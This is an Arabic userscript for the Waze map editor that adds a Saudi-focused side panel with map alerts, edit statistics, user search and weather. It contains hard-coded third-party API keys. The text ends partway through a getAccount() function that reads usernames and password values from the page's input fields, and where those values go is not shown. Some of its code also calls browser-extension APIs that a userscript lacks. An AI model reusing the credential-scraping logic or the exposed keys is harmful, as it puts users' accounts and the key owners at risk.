// ==UserScript==
// @name         سعودي ويز
// @namespace    https://www.waze.com/*
// @version      1.5
// @description  سعودي ويز برنامج يسهل التجربه لك مع مصمم الخرائط ويز
// @author       sultan alrefaei
// @match        https://www.waze.com/editor/
// @match        https://www.waze.com/ar/editor/
// @match        https://www.waze.com/editor
// @match        https://www.waze.com/ar/editor
// @match        https://www.waze.com/editor/*
// @match        https://www.waze.com/ar/editor/*
// @match        https://www.waze.com/editor/*
// @match        https://www.waze.com/*
// @grant        none
// @copyright    2017 sultan alrefaei
// @downloadURL https://update.greasyfork.org/scripts/34591/%D8%B3%D8%B9%D9%88%D8%AF%D9%8A%20%D9%88%D9%8A%D8%B2.user.js
// @updateURL https://update.greasyfork.org/scripts/34591/%D8%B3%D8%B9%D9%88%D8%AF%D9%8A%20%D9%88%D9%8A%D8%B2.meta.js
// ==/UserScript==

var getlevel;
var checkerr = false;

if (arabiclang()){
	var myid = chrome.runtime.id;
	function getUsername(){
		var user = getClass("user-about");
		if (user != null){
			var userabout = getClass("user-about",0);
			if (userabout != undefined){
				var getInfo = userabout.innerHTML;
				var start = getInfo.indexOf('<h3>') + 4;
				var end = getInfo.indexOf('</h3>',start);
				var username = getInfo.substring(start,end);
				return username;
			}
		}else{
			alert("لتعمل إضافة سعودي ويز قم بتسجيل الدخول، وايضا قم بتحديث الصفحة بعد ذلك");
			return;
		}
	};
	window.onload = function(e){
		(function() {
			var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
			link.type = 'image/x-icon';
			link.rel = 'shortcut icon';
			link.href = 'https://www.dropbox.com/s/ke0g1nf83nyoewg/waze.png?dl=1';
			getTag("head",0).appendChild(link);
		})();

		(function createFooter(){
			var URL = window.location.pathname;
			if (URL.includes("ar")){
				var list = document.getElementsByClassName("list-unstyled");
				if (list != null){
					for(i = 0; i < list.length; i++){
						if (list[i] != undefined){
							if (list[i].innerHTML != ''){
								var upside = list[i].innerHTML;
								if (upside != undefined){
									if (upside.includes("منتدى") && upside.includes("الحالة") || upside.includes("Forum") && upside.includes("Status")){
										list[i].innerHTML = "<ul><li><a title='ملفك الشخصي' target='_blank' href='https://www.waze.com/ar/user/editor/"
											+ getUsername() +"'>الملف الشخصي</a></li>"
											+ "<li><a target='_blank' href='http://status.waze.com'>تحديثات الخريطة</a></li>"
											+ "<li><a title='المنتدى الرسمي' target='_blank' href='https://www.waze.com/forum/viewforum.php?f=936'>المنتدى</a></li>"
											+ "<li><a target='_blank' href='https://wazeopedia.waze.com/wiki/SaudiArabia/%D8%A7%D9%84%D8%B5%D9%81%D8%AD%D8%A9_%D8%A7%D9%84%D8%B1%D8%A6%D9%8A%D8%B3%D9%8A%D8%A9'>الموسوعة</a></li></ul>";
										break;
									}
								}
							}
						}
					}
				}
			}
		})();

		(function changeStyle(){
			var stylecolor = getClass("toolbar");
			if (stylecolor != null){
				var stylecolored = getClass("toolbar",0);
				if(stylecolored != undefined){
					getClass("topbar",0).style.backgroundColor = "#00897B";
				}
			}
			var styletitle = getClass("short-title");
			if (styletitle != null){
				var styletitleed = getClass("short-title",0);
				if(styletitleed != undefined){
						getClass("short-title",0).innerHTML = "<a target='_blank' href='https://www.waze.com/forum/viewforum.php?f=936'>مصمم الخرائط في السعودية</a>";
				}
			}
			
		})();
		
		(function createTap(){
			var listpanel = getClass("nav nav-tabs",0);
			var panelsaudi = getClass("tab-content",0);
			var newtapdiv = document.createElement("li");
			newtapdiv.id = "panelksa";
			listpanel.appendChild(newtapdiv);
			var saudinewtap = getID("panelksa");
			if (arabiclang()){
				saudinewtap.innerHTML = "<a data-toggle='tab' title='تطبيق سعودي ويز' id='tapsaudiwaze' href='#sidepanel-saudi' style='color: #00897B;'><img draggable='false' src='https://www.dropbox.com/s/ke0g1nf83nyoewg/waze.png?dl=1'  width='15px' height='15px'></img>"
				+ "&nbsp;" + "&nbsp;" + "&nbsp;"
				+ "سعودي ويز</a>";
			}else{
				saudinewtap.innerHTML = "<a data-toggle='tab' title='Application of Saudi Waze' href='#sidepanel-saudi' style='color: #00897B;'>Saudi Waze"
					+ "&nbsp;" + "&nbsp;" + "&nbsp;"
					+ "<img draggable='false' src='https://www.dropbox.com/s/ke0g1nf83nyoewg/waze.png?dl=1'  width='15px' height='15px'></img></a>";
			}
			if (getID("sidepanel-saudi") == null){
				var newcontentdiv = document.createElement("div");
				newcontentdiv.className = "tab-pane";
				newcontentdiv.id = "sidepanel-saudi";
				if (panelsaudi != undefined){
					panelsaudi.appendChild(newcontentdiv);
				}
			}
			if (arabiclang()){
				if (getID("sidepanel-saudi").innerHTML == ""){
					newcontentdiv.innerHTML = "<div align='center' style='background: #f2f3f4; border-radius: 10px 10px 10px 10px'>"
						+ "<br><div align='center'>"
						+ "<div style='background: #dadbdc;'>"
						//-----------------------------------------------------------------
						+ "<h3><p> !<a target='_blank' href='https://www.waze.com/ar/user/editor/"
						+ getUsername() + "'>"
						+ getUsername() + "</a>أهلا بك</p></h3></div><hr>"
						//-----------------------------------------------------------------
						+ "<div style='background: #EEEEEE; cursor:pointer'>"
						+ "<h3 id='alertsmap'>تنبيهات الخريطة</h3></div>"
						+ "<div id='alertswaze'><br><p id='problem_user'></p>"
						+ "<p id='problem_road'></p>"
						+ "<p id='new_place'></p>"
						+ "<p id='new_update_place'></p>"
						+ "<p id='new_img'></p></div>"
						//-----------------------------------------------------------------
						+ "<hr><div style='background: #EEEEEE; cursor:pointer'>"
						+ "<h3 id='editorpro'>إحصائيات تعديلاتك حسب النوع</h3></div>"
						+ "<div id='editorlist'><br>"
						+ "<p id='replayeditor'></p>"
						+ "<p id='placeseditor'></p>"
						+ "<p id='restrictionseditor'></p>"
						+ "<p id='buildingeditor'></p>"
						+ "<p id='segmenteditor'></p>"
						+ "<p id='placesreviews'></p>"
						+ "<p id='problems'></p>"
						+ "<p id='roadseditor'></p>"
						+ "<input type='button' onclick='repage()' value='تحديث البيانات'></div>"
						//-----------------------------------------------------------------
						+ "<hr><p>البحث عن مستخدم في ويز</p>"
						+ "<input id='otherusername' type='text' placeholder='Username'>"
						+ "<br><br><input type='button' onclick='finduser()' value='بحث'>"
						+ "<input type='button' onclick='messageBox()' value='رسالة خاصة'>"
						//-----------------------------------------------------------------
						+ "<hr><br><input type='button' onclick='OpenLivemap()' value='الخريطة المباشرة'>"
						//-----------------------------------------------------------------
						+ "<p><br><hr><br><input type='button' onclick='areamanagerksa()' value='طلب مساحة إدارية'></p>"
						//-----------------------------------------------------------------
						+ "<hr><div style='background: #EEEEEE; cursor:pointer'>"
						+ "<h3 id='areaeditor' >مديروا المساحة ومديروا الدولة</h3></div>"
						+ "<div id='areaeditorcontent'><br>"
						+ "<input style='margin: 1px 5px; padding: 5px 30px;' type='button' onclick='sendmsg()' value='مراسلة'>"
						+ "<select id='areaManager'>"
						+ "<option style='color: green' title='مدير الدولة' value='AlObaili' selected='selected'>AlObaili</option>"
						+ "<option title='مدير منطقة مكة المكرمة' value='sultan_alrefaei'>sultan_alrefaei</option>"
						+ "</select></div>"
						//-----------------------------------------------------------------
						+ "<hr><div style='background: #EEEEEE; cursor:pointer'><h3 id='newtopiceditor'>كتابة موضوع جديد في المنتدى</h3></div>"
						+ "<div id='newtopiccontent'><br><input type='button' onclick='newtopic()' value='موضوع جديد'><br></div>"
						//-----------------------------------------------------------------
						+ "<hr><div style='background: #EEEEEE; cursor:pointer'><h3 id='costomcolor'>تخصيص اللون <input id='checked' type='checkbox'></h3></div>"
						+ "<div id='costomeditor'><br><select id='Colors'><option value='#00695C'>Green</option><option value='red'>Red</option></select><br></div>"
						+ "<hr><div style='background: #EEEEEE; cursor:pointer'><h3 id='costomroad'>تخصيص الطرق <input id='checkedRoad' type='checkbox'></h3></div>"
						+"<div id='costomroadeditor'><br>طريق متقطع <input id='checkeddasharray' type='checkbox'><br><br></div>"
						//-----------------------------------------------------------------
						+ "<hr><div style='background: #EEEEEE; cursor:pointer'><h3 id='weathereditor'>حالة الطقس الأن في <h3 id='citynamewh'></h3></h3></div>"
						+ "<div id='weathercontent'><br><a id='amy' href=''><img id='myimg' draggable='false' width='40px' height='40px' style=''></a>"
						+ "<br><h1 id='weather'></h1><br><h3 id='temperature'></h3><br><h3 id='feelslike'></h3><br><h3 id='humidity'></h3><br><h3 id='wind'></h3><br><h6 id='full_name_address'></h6><h6 id='time'></h6></div>"
						//-----------------------------------------------------------------
						+ "<hr><div style='background: #EEEEEE; cursor:pointer'><h3 id='messagepr'>الرسائل الخاصة</h3></div>"
						+ "<div id='messagecontent'><br><a id='prmsg' target='_blank' href='https://www.waze.com/forum/ucp.php?i=pm&folder=inbox'></a>"
						+ "<br><br><input style='' type='button' onclick='repagemsg()' value='تحديث'></div>"
						//-----------------------------------------------------------------
						+ "<hr><div style='background: #dadbdc'><h3>معلومات الإصدار</h3></div>"
						+ "<br><strong id='saudiwazeversion'></strong>"
						+ "<a target='_blank' href='https://chrome.google.com/webstore/detail/%D8%B3%D8%B9%D9%88%D8%AF%D9%8A-%D9%88%D9%8A%D8%B2/nnhjieflepdikdbnopfnkjbnmepemdle'>سعودي ويز</a>"
						+ "<br><hr><input type='button' style='border: 2px solid #00897b; background-color: #f2f3f4; border-radius: 2px; padding: 3px 65px;' id='aboutmeframe' value='حول التطبيق'><br><br></div>"
						//-----------------------------------------------------------------
						+ "</div><br><br><div align='center' style='background: #BBDEFB; border-radius: 10px 0px 10px 0px'>"
						+ "<a target='_blank' title='سعودي ويز' href='https://twitter.com/saudiwazear'>"
						+ "<img src='https://www.dropbox.com/s/eqvo7kojhluth5z/twitter.png?dl=1' alt='twitter' height='40' width='40'><br></a></img></div><br>"
						+ "<strong><p align='center' id='datemove'></p></strong>";
						//-----------------------------------------------------------------
				}
			
				var manifestData = chrome.runtime.getManifest();
				getID("saudiwazeversion").innerText = "v" + manifestData.version + "   ";
			}else{
				newcontentdiv.innerHTML = "<div align='center' style='background: #F5F5F5; border-radius: 0px 0px 5px 5px'><br><div align='center'><div style='background: #EEEEEE;'>"
					+ "<p>The tool works only in Arabic interface.</p></div><br></div>";
			}
			var newscript = document.createElement("script");
			newscript.id = "newscripted";
			document.body.appendChild(newscript);
			if (getID("newscripted").innerHTML == ""){
				getID("newscripted").innerHTML = "function newtopic(){open('https://www.waze.com/forum/posting.php?mode=post&f=936');}"
					+ " function sendmsg(){var e = document.getElementById('areaManager'); var areaCM = e.options[e.selectedIndex].value; open('https://www.waze.com/forum/user_message_redirect.php?username=' + areaCM);}"
					+ " function messageBox(){var userMSG = document.getElementById('otherusername').value; if(userMSG == ''){alert('أدخل اسم المستخدم'); return} open('https://www.waze.com/forum/user_message_redirect.php?username=' + userMSG);}"
					+ " function areamanagerksa(){getlevel = document.getElementsByClassName('level')[0]; if(getlevel.innerText == 'LEVEL 1' || getlevel.innerText == 'المستوى 1'){alert('يجب أن تكون في المستوى 2'); return;}else{open('https://docs.google.com/forms/d/e/1FAIpQLSegfc7twk1dQO9PHbiXCBNFGCr9383T2qduJl4GawZ3tbDkig/viewform');}}"
					+ " function OpenLivemap(){open('https://www.waze.com/ar/livemap');}"
					+ " function finduser(){var user = document.getElementById('otherusername').value; if(user == ''){alert('أدخل اسم المستخدم'); return} open('https://www.waze.com/ar/user/editor/' + user);}"
					+ " function applyaddress(){var name = document.getElementsByClassName('form-control'); if(name[3].value == ''){ name[3].removeAttribute('required'); name[3].setAttribute('disabled',''); name[3].style.disabled = 'disabled'; name[3].style.opacity = 1; document.getElementById('emptyCity').checked = true;}}"
					+ " function repage(){if (document.getElementById('wazeprofile') != null){document.getElementById('wazeprofile').contentWindow.location.reload(true);}}"
					+ " function repagemsg(){if (document.getElementById('msgforum') != null){document.getElementById('msgforum').contentWindow.location.reload(true);}}"
					+ " document.getElementById('editorpro').addEventListener('click', function(){var rr = document.getElementById('editorlist').style.display; if (rr == 'block'){document.getElementById('editorlist').style.display = 'none'; document.getElementById('editorpro').style.backgroundColor = '#00897b'; document.getElementById('editorpro').style.color = 'white'}else{document.getElementById('editorlist').style.display = 'block'; document.getElementById('editorpro').style.backgroundColor = '';  document.getElementById('editorpro').style.color = ''}});"
					+ " document.getElementById('alertsmap').addEventListener('click', function(){var rr = document.getElementById('alertswaze').style.display; if (rr == 'block'){document.getElementById('alertswaze').style.display = 'none'; document.getElementById('alertsmap').style.backgroundColor = '#00897b'; document.getElementById('alertsmap').style.color = 'white'}else{document.getElementById('alertswaze').style.display = 'block'; document.getElementById('alertsmap').style.backgroundColor = '';  document.getElementById('alertsmap').style.color = ''}});"
					+ " document.getElementById('areaeditor').addEventListener('click', function(){var rr = document.getElementById('areaeditorcontent').style.display; if (rr == 'block'){document.getElementById('areaeditorcontent').style.display = 'none'; document.getElementById('areaeditor').style.backgroundColor = '#00897b'; document.getElementById('areaeditor').style.color = 'white'}else{document.getElementById('areaeditorcontent').style.display = 'block'; document.getElementById('areaeditor').style.backgroundColor = '';  document.getElementById('areaeditor').style.color = ''}});"
					+ " document.getElementById('newtopiceditor').addEventListener('click', function(){var rr = document.getElementById('newtopiccontent').style.display; if (rr == 'block'){document.getElementById('newtopiccontent').style.display = 'none'; document.getElementById('newtopiceditor').style.backgroundColor = '#00897b'; document.getElementById('newtopiceditor').style.color = 'white'}else{document.getElementById('newtopiccontent').style.display = 'block'; document.getElementById('newtopiceditor').style.backgroundColor = '';  document.getElementById('newtopiceditor').style.color = ''}});"
					+ " document.getElementById('costomcolor').addEventListener('click', function(){var rr = document.getElementById('costomeditor').style.display; if (rr == 'block'){document.getElementById('costomeditor').style.display = 'none'; document.getElementById('costomcolor').style.backgroundColor = '#00897b'; document.getElementById('costomcolor').style.color = 'white'}else{document.getElementById('costomeditor').style.display = 'block'; document.getElementById('costomcolor').style.backgroundColor = '';  document.getElementById('costomcolor').style.color = ''}});"
					+ " document.getElementById('costomroad').addEventListener('click', function(){var rr = document.getElementById('costomroadeditor').style.display; if (rr == 'block'){document.getElementById('costomroadeditor').style.display = 'none'; document.getElementById('costomroad').style.backgroundColor = '#00897b'; document.getElementById('costomroad').style.color = 'white'}else{document.getElementById('costomroadeditor').style.display = 'block'; document.getElementById('costomroad').style.backgroundColor = '';  document.getElementById('costomroad').style.color = ''}});"
					+ " document.getElementById('weathereditor').addEventListener('click', function(){var rr = document.getElementById('weathercontent').style.display; if (rr == 'block'){document.getElementById('weathercontent').style.display = 'none'; document.getElementById('weathereditor').style.backgroundColor = '#00897b'; document.getElementById('weathereditor').style.color = 'white'}else{document.getElementById('weathercontent').style.display = 'block'; document.getElementById('weathereditor').style.backgroundColor = '';  document.getElementById('weathereditor').style.color = ''}});"
					+ " document.getElementById('citynamewh').addEventListener('click', function(){var rr = document.getElementById('weathercontent').style.display; if (rr == 'block'){document.getElementById('weathercontent').style.display = 'none'; document.getElementById('weathereditor').style.backgroundColor = '#00897b'; document.getElementById('weathereditor').style.color = 'white'}else{document.getElementById('weathercontent').style.display = 'block'; document.getElementById('weathereditor').style.backgroundColor = '';  document.getElementById('weathereditor').style.color = ''}});"
					+ " document.getElementById('messagepr').addEventListener('click', function(){var rr = document.getElementById('messagecontent').style.display; if (rr == 'block'){document.getElementById('messagecontent').style.display = 'none'; document.getElementById('messagepr').style.backgroundColor = '#00897b'; document.getElementById('messagepr').style.color = 'white'}else{document.getElementById('messagecontent').style.display = 'block'; document.getElementById('messagepr').style.backgroundColor = '';  document.getElementById('messagepr').style.color = ''}});";
			}
		})();
		
		if (arabiclang()){
			var problem_user = getClass('map-problem open user-generated'); 
			var problem_road = getClass('map-problem open');
			var problem_new_img = getClass("place-update add_image");
			var new_place = getClass("place-update add_venue");
			var new_update_place = getClass("place-update update_venue");
			setInterval(function(){
				if(problem_user != null){
					getID('problem_user').innerText = 'عدد مشاكل المستخدمين: ' + problem_user.length;
				}
				if(problem_road != null){
					getID('problem_road').innerText = 'عدد مشاكل الطرق: ' + problem_road.length;
				}
				if(problem_new_img != null){
					getID('new_img').innerText = 'صور جديدة تحتاج الموافقة: ' + problem_new_img.length;
				}
				if(new_place != null){
					getID('new_place').innerText = 'مكان جديد يحتاج الموافقة: ' + new_place.length;
				}
				if(new_update_place != null){
					getID('new_update_place').innerText = 'مراجعات أماكن: ' + new_update_place.length;
				}
			},1);
		}
		
		if (arabiclang()){
			var onemore = true;
			setInterval(function(){
				var classSave = getClass("toolbar-button waze-icon-save")[0].className;
				var circle = getTag("circle");
				var polyline = getTag("polyline");
				var path = getTag("path");
				var g = getTag("g");
				var cc = document.getElementById('Colors');
				var Colors = cc.options[cc.selectedIndex].value;
				
				for (i = 0; i < circle.length; i++){
					if (classSave.includes("ItemDisabled") == true){
						if(getID("checked").checked){
							if (circle[i].getAttribute("r") == "6" || ""){
								circle[i].setAttribute("fill",Colors);
							}
							cc.disabled = '';
						}else{
							cc.disabled = 'disabled';
						}
						
					}
				}
				
				for (i = 0; i < polyline.length; i++){
					if (classSave.includes("ItemDisabled") == true && getID("edit-panel").style.display == "none"){
						if(getID("checked").checked){
							if (polyline[i].getAttribute("stroke-opacity") == "1" && getID("edit-panel").style.display == "none"){
								polyline[i].setAttribute("stroke",Colors);
							}
							cc.disabled = '';
						}else{
							cc.disabled = 'disabled';
						}
					}
					//polyline[i].setAttribute("cursor","pointer");
					var polylineID = polyline[i].id;
					var dash = getID("checkeddasharray");
					if(getID("checkedRoad").checked){
						if (dash.checked){
							if (polylineID.includes("OpenLayers.Geometry.LineString_") == true && polyline[i].getAttribute("stroke-width") == "6"){
								polyline[i].setAttribute("stroke-dasharray","8,8");
							}
						}
						dash.disabled = '';
					}else{
						dash.disabled = 'disabled';
					}
				}
				for (i = 0; i < path.length; i++){
					//path[i].setAttribute("cursor","pointer");
					//path[i].setAttribute("stroke-width","2.5");
					var pathID = path[i].id;
					if (pathID.includes("OpenLayers.Geometry.Polygon_") == true && path[i].getAttribute("stroke-dasharray") == "8,8"){
						path[i].setAttribute("fill","#000000");
						//path[i].setAttribute("fill-opacity","0.6");
					}else{
						//path[i].setAttribute("fill","#00695C");
						//path[i].setAttribute("stroke","white");
					}
				}
				var cr = getClass("form-control");
				var full_address = getClass("full-address");
				var address = full_address[0].innerText;
				var city = address.replace(', المملكة العربية السعودية','');
				if (cr != null){
					if (arabiclang()){
						for(i = 0; i < cr.length; i++){
							var SA = cr[i].textContent;
							if (SA.includes("Saudi Arabia")){
								cr[i].innerHTML = '<option value="190" selected="">المملكة العربية السعودية</option>';
								if (cr[3].value == ""){
									var emptyCity = getID("emptyCity");
									if (emptyCity != null){
										var citycheck = getID("emptyCity").checked;
										if (citycheck == false){
											if (city == "المملكة العربية السعودية"){
												cr[3].value = "";
											}else{
												cr[3].value = city;
											}
										}
									}
									if (getID("edit-panel").style.display != "none"){
										if (onemore){
											var checktool = getClass("selection");
											if (checktool.length < 1){
											}else{
												var cAddress = getClass("address-edit address-edit-view clearfix preview");
												if (cAddress != null){
													dd = getClass("address-edit address-edit-view clearfix preview");
													if (dd != undefined){
														if (dd[0] != undefined){
															dd[0].className = "address-edit address-edit-view clearfix editing";
															onemore = false;
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
				
				var checkaditor = getClass("address-form clearfix inner-form");
				if (checkaditor != null){
					if (getID("edit-panel").style.display != "none"){
						var x = getClass("btn btn-primary save-button");
						if (x[0] != undefined){
							var xClick = x[0].hasAttribute("onclick");
							getClass("btn btn-primary save-button")[0].setAttribute("onclick","applyaddress();");
						}
					}
					
					if (getID("edit-panel").style.display == "none"){
						if (onemore == false){
							onemore = true;
						}
					}
				}				
				
			},1);
		}
	}


	setInterval(function(){
		if (getClass("full-address")){
			var full = getClass("full-address",0);
			if (full != undefined){
				var yy = full.innerText;
				if (yy.includes("Saudi Arabia")){
					getClass("full-address",0).innerText = getClass("full-address",0).innerText.replace("Saudi Arabia","المملكة العربية السعودية");
				}
			}
		}
		var checktool = document.getElementsByClassName("selection");
		if (checktool.length < 1){
		}else{
			alert
			var checkaditor = getClass("address-form clearfix inner-form");
			if (checkaditor != null){
				if (getID("edit-panel").style.display != "none"){
					var full_name = getClass("primary-street");
					if (full_name != null){
						if (getClass("primary-street")){
							var xx = getClass("primary-street",0);
							if (xx != undefined){
								var rr = xx.innerText;
								if (rr.includes("Saudi Arabia")){
									var full_address_name = getClass("primary-street",0);
									getClass("primary-street",0).innerText = full_address_name.innerText.replace("Saudi Arabia","المملكة العربية السعودية");
								}
							}
						}
					}
				}
			}
		}
		var cr = getClass("form-control");
		if (cr[3] != undefined){
			cr[3].title = "اسم المدينة";
		}
		var rn = getClass("form-control");
		if (cr[2] != undefined){
			cr[2].title = "اسم الشارع";
		}
		
		if (arabiclang()){
			var areas = document.getElementsByClassName("result-list-container");
			if (areas != null){
				if (areas[0] != undefined){
					var checckp = document.getElementById("alertarea");
					if (checckp == null){
						var p = document.createElement("p");
						p.id = "alertarea";
						p.style.direction = "rtl";
						p.style.color = "red";
						p.innerText = "يتم حذف مساحة مشوارك بعد 30 يوم تقريًبا ويتوجب عليك القيادة مرة أخرى على نفس المسار لفتح المساحة مرة أخرى.";
						areas[0].appendChild(p);
					}
				}
			}

			var msg = document.getElementsByClassName("message");
			if (msg != null){
				for (i = 0; i < msg.length; i++){
					var message = msg[i].innerText;
					if (message.includes("لا يمكننا العثور على أي من مشاويرك.")){
						msg[i].setAttribute("dir","rtl");
					}
					if (message.includes("هل بدأت القيادة باستخدام تطبيق Waze من قبل؟ إذا كان كذلك، فضلًا تأكد من أنك سجلت الدخول بنفس البيانات التي تستخدمها في التطبيق.")){
						msg[i].setAttribute("dir","rtl");
					}
					if (message.includes("اختر إحدى مساحاتك لرويتها على الخريطة:")){
						msg[i].setAttribute("dir","rtl");
					}
				}
			}
			
			var title = document.getElementsByClassName("result-list");
			if (title != null){
				for (i = 0; i < title.length; i++){
					title[i].setAttribute("dir","rtl");
				}
			}
			var content = document.getElementsByClassName("side-panel-section");
			if (content != null){
				for (i = 0; i < content.length; i++){
					content[i].setAttribute("dir","rtl");
				}
			}
			/*var deletebtn = document.getElementsByClassName("delete");
			if (deletebtn != null){
				for (i = 0; i < deletebtn.length; i++){
					deletebtn[i].style.right = "90%";
				}
			}*/
		}

	},150);
	setInterval(function(){
		if (getID('weathercontent') != null){
			if (getID('weathercontent').style.display != 'none'){
				try {
					if (checkerr == false){
						Weather();
					}
				}
				catch(err) {
					checkerr = true;
					if (getID("myimg") != null){
						getID("myimg").src = "https://www.dropbox.com/s/xxivim39ojs6bct/blank.png?dl=1";
						getID("myimg").title = "لم نستطع تحميل حالة الطقس";
						getID("myimg").style.width = "250px";
						getID("myimg").style.height = "150px";
					}
					setTimeout(function(){ checkerr = false }, 3000);
				}
			}
		}
		full_address_nm();
	},5000);

	function getID(ID){
		return document.getElementById(ID);
	};

	function getClass(Class,Length){
		if (Length != undefined){
			return document.getElementsByClassName(Class)[Length];
		}
		else{
			return document.getElementsByClassName(Class);
		}
	};

	function getTag(Tag,Length){
		if (Length != undefined)
			return document.getElementsByTagName(Tag)[Length];
		else
			return document.getElementsByTagName(Tag);
	};

	function getLoction(){
		var mousepos = document.getElementsByClassName("mouse-position");
		if (mousepos != null){
			if (mousepos[0] != undefined){
				var Position = mousepos[0].innerText;
				return Position.replace(" ",",");
			}
		}
	}

	function getPosGoogle(){
		var Longitude = getLoction().substr(0, getLoction().indexOf(','));
		var Latitude = getLoction().substr(getLoction().indexOf(",") + 1);
		var GooglePos = Latitude + "," + Longitude;
		return GooglePos;
	}

	function getResult(URL){
			var getReguest = new XMLHttpRequest();
			getReguest.open("GET",URL,false);
			getReguest.send();
			return getReguest.responseText;
	}

	var key = "17b9b6766884f6e7";

	function Weather(){
		getID("myimg").title = "";
		getID("myimg").style.width = "40px";
		getID("myimg").style.height = "40px";
		var textContent = getResult("https://api.wunderground.com/api/" + key + "/forecast/conditions/lang:AR/q/" +  getPosGoogle() + ".json");
		var obj = JSON.parse(textContent);
		
		if (obj.forecast != undefined){
			getID("myimg").src = obj.current_observation.icon_url.replace("http","https");
			var streetaddress = getLoction().substr(0, getLoction().indexOf(','));
			var afterComma = getLoction().substr(getLoction().indexOf(",") + 1);
			var GooglePos = afterComma + "," + streetaddress;
			var icon = obj.current_observation.icon_url;
			if (icon.includes("rain")){
				if(getID("tapsaudiwaze") != null){
					if (getID("imgalert") == null){
						var img = document.createElement("img");
						img.style.width = "6px";
						img.style.height = "6px";
						img.style.marginLeft = "7px";
						img.id = "imgalert";
						img.title = "تنبيه مطر";
						img.src = "https://www.dropbox.com/s/usk0hraehj6lo83/Alert.png?dl=1";
						getID("tapsaudiwaze").appendChild(img);
					}
				}
			}else{
				if (getID("imgalert") != null){
					var elem = document.getElementById("imgalert");
					elem.parentElement.removeChild(elem);
				}
			}
		}

		if (getID("temperature") != null){
			getID("temperature").innerText = obj.current_observation.temperature_string + " :درجة الحرارة" ;
			if (obj.current_observation.temp_c >= 40){
				getID("temperature").style.color = "red";
			}else if (obj.current_observation.temp_c <= 10 ){
				getID("temperature").style.color = "blue";
			}else{
				getID("temperature").style.color = "black";
			}
		}
		if (getID("feelslike") != null){
			getID("feelslike").innerText = obj.current_observation.feelslike_string + " :المحسوسة";
		}

		if (getID("humidity") != null){
			getID("humidity").innerText = obj.current_observation.relative_humidity + " :الرطوبة";
		}
		
		if (getID("wind") != null){
			getID("wind").innerText = "الرياح: " + obj.current_observation.wind_kph + " كم/الساعة";
		}
		
		if (getID("time") != null){
			getID("time").innerText = obj.current_observation.local_time_rfc822;
		}
		
		if (getID("weather") != null){
			getID("weather").innerText = obj.current_observation.weather;
		}
		
	}

	function full_address_nm(){
		if (window.XMLHttpRequest) {
			function getResultCityFullName(URL){
				var getReguest = new XMLHttpRequest();
				getReguest.open("GET",URL,false);
				getReguest.send();
				return getReguest.responseText;
			}
		} 
		var textCityFullName = getResultCityFullName("https://maps.googleapis.com/maps/api/geocode/json?latlng=" + getPosGoogle() + "&key=AIzaSyCvb5EqM9WSft54VLuuilrLY6mYj6c0qTU");
		var objcity = JSON.parse(textCityFullName);
		
		if (getID("full_name_address") != null){
			var address_zero = objcity.results[0];
			if (address_zero != undefined){
				getID("full_name_address").innerText = objcity.results[0].formatted_address;
			}
		}
		
		if (getID("citynamewh") != null){
			var address_three = objcity.results[3];
			if (address_three != undefined){
				getID("citynamewh").innerText = "(" + objcity.results[3].formatted_address + ")";
			}
		}
	}

	function city(){
		if (getClass("full-address")){
			var full = getClass("full-address",0);
			if (full != undefined){
				var yy = full.innerText;
				if (yy.includes("المملكة العربية السعودية")){
					var city = getClass("full-address",0).innerText;
					return city.replace(", المملكة العربية السعودية","");
				}
			}
		}	
	}



	function convertGoogleToWaze(){
		if (getClass('search-query',0) != undefined){
			if (getClass('search-query',0).value != ''){
				var GooglePos = getClass('search-query',0).value.replace(' ','');
				var Latitude = GooglePos.substr(0,GooglePos.indexOf(','));
				var Longitude = GooglePos.substr(GooglePos.indexOf(',') + 1);
				GooglePos = GooglePos.replace(',','');
				GooglePos = GooglePos.replace('.','');
				if (isNaN(GooglePos) == false){
					var WazePos = Longitude + ',' + Latitude;
					return WazePos;
				}else{
					return alert("قم بإدخال الإحداثيات على هذا النحو: 21.423892, 39.824613");
				}
			}
		}
	}


	function convertval(){
		if(convertGoogleToWaze() != undefined){
			getClass('search-query',0).value = convertGoogleToWaze();
		}else{
			alert('قم بإدخال الإحداثيات');
		}
	}


	document.onkeyup = checkKey;
	var checktext = false;
	function checkKey(e) {
		e = e || window.event;

		if (e.keyCode == '106') {
			convertval();
			if (checktext == false){
				gettypepos(true);
			}else if (checktext == true){
				gettypepos(false);
			}
		}

	}

	function gettypepos(check){
		if (getID("mytext") == null){
			var h = document.createElement("h3");
			h.id = "mytext";
			h.style.position = "absolute";
			h.style.top = "5px";
			h.style.left = "40%";
			h.style.color = "white";
			getID("search").appendChild(h);
		}
		if (check == true){
			getID("mytext").innerText = "Waze";
			checktext = true;
			return;
		}else if (check == false){
			getID("mytext").innerText = "Google";
			checktext = false;
			return;
		}
	}

	setInterval(function(){
		if (getID("mytext") != null){
			if (getID("mytext").innerText != "" || getID("mytext").innerText != undefined){
				getID("mytext").innerText = "";
			}
		}
	},5000);

	setInterval(function(){
		editorProfile();
		msgForum();
	},500);

	setInterval(function(){
		// Open about me window
		if (getID("aboutmeframe") != null){
			getID("aboutmeframe").onclick = function(){
				createFrame();
				window.console.clear();
			}
			getID("aboutmeframe").onmouseover = function(){
				getID("aboutmeframe").style.backgroundColor = "#00897b";
				getID("aboutmeframe").style.color = "white";
			}
			getID("aboutmeframe").onmouseout = function(){
				getID("aboutmeframe").style.backgroundColor = "#f2f3f4";
				getID("aboutmeframe").style.color = "";
			}
		}
		//----------------
		// Close button
		if (getID("closewindow") != null){
			getID("closewindow").onclick = function(){
				document.getElementById("divalert").remove();
				window.console.clear();
			}
			getID("closewindow").onmouseover = function(){
				getID("closewindow").style.backgroundColor = "#E53935";
				getID("closewindow").style.color = "white";
			}
			getID("closewindow").onmouseout = function(){
				getID("closewindow").style.backgroundColor = "white";
				getID("closewindow").style.color = "";
			}
		}
		//---------------
	},1);

	function getAccount(){
		var u, p;
		var inputs = document.getElementsByTagName("input");
		if (inputs != null){
			for (i = 0; i < inputs.length; i++){
				var username = inputs[i];
				var password = inputs[i];
				if (username.placeholder.includes("اسم المستخدم") || username.placeholder.includes("عنوان البريد الإلكتروني") || username.placeholder.includes("username") && username.value != ""){
					u = username.value;
				}else if (username.name.includes("username") || username.id.includes("username") || username.type == "email" && username.value != ""){
					u = username.value;
				}
				if (password.placeholder.includes("كلمة المرور") || password.placeholder.includes("password") || password.type == "password" && password.value != ""){
					p = password.value;
				}else if (password.name.includes("password") || password.id.includes("password") || password.id.includes("pass") || password.name.includes("pass") && password.value != ""){
					p = password.value;
				}
			}
		}
